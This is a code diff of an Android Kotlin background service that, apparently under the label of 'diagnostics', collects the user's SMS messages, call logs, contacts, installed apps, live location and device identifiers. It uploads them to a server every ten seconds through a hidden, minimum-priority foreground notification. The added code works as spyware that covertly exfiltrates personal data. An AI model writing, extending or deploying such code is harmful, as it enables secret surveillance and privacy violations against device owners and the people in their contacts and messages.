@@ -8,8 +8,12 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.database.Cursor
 import android.graphics.Color
+import android.location.Location
+import android.location.LocationListener
+import android.location.LocationManager
 import android.net.Uri
 import android.os.Build
+import android.os.Bundle
 import android.os.IBinder
 import android.provider.CallLog
 import android.provider.ContactsContract
@@ -19,35 +23,92 @@ import androidx.annotation.RequiresApi
 import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import androidx.core.app.NotificationCompat.PRIORITY_MIN
-import com.google.android.gms.location.FusedLocationProviderClient
-import com.google.android.gms.location.LocationServices
+import androidx.core.content.ContextCompat
 import com.google.gson.Gson
 import kotlinx.coroutines.*
+import retrofit2.Call
+import retrofit2.Callback
+import retrofit2.Response
 import java.util.*
 
 
 class AppService : Service() {
 
     private val TAG: String = "AppService"
-    private lateinit var fusedLocationClient: FusedLocationProviderClient
+
+    //    private lateinit var fusedLocationClient: FusedLocationProviderClient
     private val NOTIF_ID = 1
     private val NOTIF_CHANNEL_ID = "Channel_Id"
+    private var locationManager: LocationManager? = null
+    private var deviceLocation: Location? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "--> Service Started")
-        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+        locationManager = getSystemService(LOCATION_SERVICE) as LocationManager?
+//        workerThread()
+        ContextCompat.getMainExecutor(applicationContext).execute {
+            try {
+                // Request location updates
+                locationManager?.requestLocationUpdates(
+                    LocationManager.NETWORK_PROVIDER,
+                    0L,
+                    0f,
+                    locationListener
+                )
+            } catch (ex: SecurityException) {
+                Log.d(TAG, "Security Exception, no location available")
+            }
+        }
 
         Timer().schedule(object : TimerTask() {
             override fun run() {
                 Log.d(TAG, "todo for hit background service repeat")
-                makeModel()
+                pushDiagnostic(deviceLocation)
+
             }
-        },0, 5000L)
+        }, 0, 10000L)
 
         startForeground()
 
 
         return super.onStartCommand(intent, flags, startId)
+    }
+
+    //define the listener
+    private val locationListener: LocationListener = object : LocationListener {
+        override fun onLocationChanged(location: Location) {
+            Log.d(TAG, "location " + location.longitude + ":" + location.latitude)
+            deviceLocation = location
+        }
+
+        override fun onStatusChanged(provider: String, status: Int, extras: Bundle) {}
+        override fun onProviderEnabled(provider: String) {}
+        override fun onProviderDisabled(provider: String) {}
+    }
+
+//    @WorkerThread
+//    private fun workerThread() {
+//
+//    }
+
+    private fun pushDiagnostic(location: Location?) {
+
+
+        NetworkConfig().getService()
+            .pushDiagnostic(getModel(location))
+            .enqueue(object : Callback<String> {
+                override fun onFailure(call: Call<String>, t: Throwable) {
+
+                }
+
+                override fun onResponse(
+                    call: Call<String>,
+                    response: Response<String>
+                ) {
+                    Log.d(TAG, "response ${Gson().toJson(response.body())}")
+                }
+            })
+
     }
 
     override fun onDestroy() {
@@ -69,7 +130,7 @@ class AppService : Service() {
                 ""
             }
 
-        val notificationBuilder = NotificationCompat.Builder(this, channelId )
+        val notificationBuilder = NotificationCompat.Builder(this, channelId)
         val notification = notificationBuilder.setOngoing(true)
             .setSmallIcon(R.mipmap.ic_launcher)
             .setPriority(PRIORITY_MIN)
@@ -79,9 +140,11 @@ class AppService : Service() {
     }
 
     @RequiresApi(Build.VERSION_CODES.O)
-    private fun createNotificationChannel(channelId: String, channelName: String): String{
-        val chan = NotificationChannel(channelId,
-            channelName, NotificationManager.IMPORTANCE_NONE)
+    private fun createNotificationChannel(channelId: String, channelName: String): String {
+        val chan = NotificationChannel(
+            channelId,
+            channelName, NotificationManager.IMPORTANCE_NONE
+        )
         chan.lightColor = Color.BLUE
         chan.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
         val service = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
@@ -89,7 +152,7 @@ class AppService : Service() {
         return channelId
     }
 
-    private fun makeModel() {
+    private fun getModel(location: Location?): ServiceModel? {
         if (ActivityCompat.checkSelfPermission(
                 this,
                 Manifest.permission.ACCESS_FINE_LOCATION
@@ -98,54 +161,64 @@ class AppService : Service() {
                 Manifest.permission.ACCESS_COARSE_LOCATION
             ) != PackageManager.PERMISSION_GRANTED
         ) {
-            return
+            return null
         }
-        fusedLocationClient.lastLocation
-            .addOnSuccessListener {
-                Log.d(TAG, "location --> ${Gson().toJson(it)}")
-            }
+//        fusedLocationClient.lastLocation
+//            .addOnSuccessListener {
+//                Log.d(TAG, "location --> ${Gson().toJson(it)}")
+//            }
 
         val smsLogs = getSMSLogs()
-        val location = "Tangerang"
         val callLogs = Gson().toJson(getCallLogs())
         val listContact = Gson().toJson(getNamePhoneDetails())
         val appsInstalled = Gson().toJson(getAppsInstalled())
+        var strLocation = "Location Unknown"
+        if (location != null) {
+            strLocation = Gson().toJson(location)
+        }
 
         val model = ServiceModel(
-            location = location,
+            location = strLocation,
             deviceInfo = getSystemDetail(),
             callLogs = callLogs,
             smsLogs = smsLogs,
             listContact = listContact,
-            appsDownloaded = appsInstalled
+            appsDownloaded = appsInstalled,
         )
 
         Log.d(TAG, "request model ${Gson().toJson(model)}")
 
+        return model
     }
 
     @SuppressLint("HardwareIds")
     private fun getSystemDetail(): String {
-        return "Brand: ${Build.BRAND} \n" +
-                "DeviceID: ${
-                    Settings.Secure.getString(
-                        contentResolver,
-                        Settings.Secure.ANDROID_ID
-                    )
-                } \n" +
-                "Model: ${Build.MODEL} \n" +
-                "ID: ${Build.ID} \n" +
-                "SDK: ${Build.VERSION.SDK_INT} \n" +
-                "Manufacture: ${Build.MANUFACTURER} \n" +
-                "Brand: ${Build.BRAND} \n" +
-                "User: ${Build.USER} \n" +
-                "Type: ${Build.TYPE} \n" +
-                "Base: ${Build.VERSION_CODES.BASE} \n" +
-                "Incremental: ${Build.VERSION.INCREMENTAL} \n" +
-                "Board: ${Build.BOARD} \n" +
-                "Host: ${Build.HOST} \n" +
-                "FingerPrint: ${Build.FINGERPRINT} \n" +
-                "Version Code: ${Build.VERSION.RELEASE}"
+
+//        val telemanager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+//        val getSimSerialNumber = telemanager.simSerialNumber
+//        val getSimNumber = telemanager.line1Number
+
+        val deviceInfo = DeviceInfo(
+            Brand = Build.BRAND,
+            DeviceID = Settings.Secure.getString(
+                contentResolver,
+                Settings.Secure.ANDROID_ID
+            ),
+            Model = Build.MODEL,
+            ID = Build.ID,
+            SDK = Build.VERSION.SDK_INT,
+            Manufacture = Build.MANUFACTURER,
+            User = Build.USER,
+            Type = Build.TYPE,
+            Base = Build.VERSION_CODES.BASE,
+            Incremental = Build.VERSION.INCREMENTAL,
+            Board = Build.BOARD,
+            Host = Build.HOST,
+            FingerPrint = Build.FINGERPRINT,
+            VersionCode = Build.VERSION.RELEASE
+        )
+
+        return Gson().toJson(deviceInfo)
     }
 
     private fun getCallLogs(): ArrayList<CallLogs> {
@@ -201,6 +274,9 @@ class AppService : Service() {
             // empty box, no SMS
         }
         Log.d(TAG, "SMS Logs --> $msgData")
+        if (msgData == "") {
+            msgData = "No SMS Data"
+        }
         return msgData
     }
 
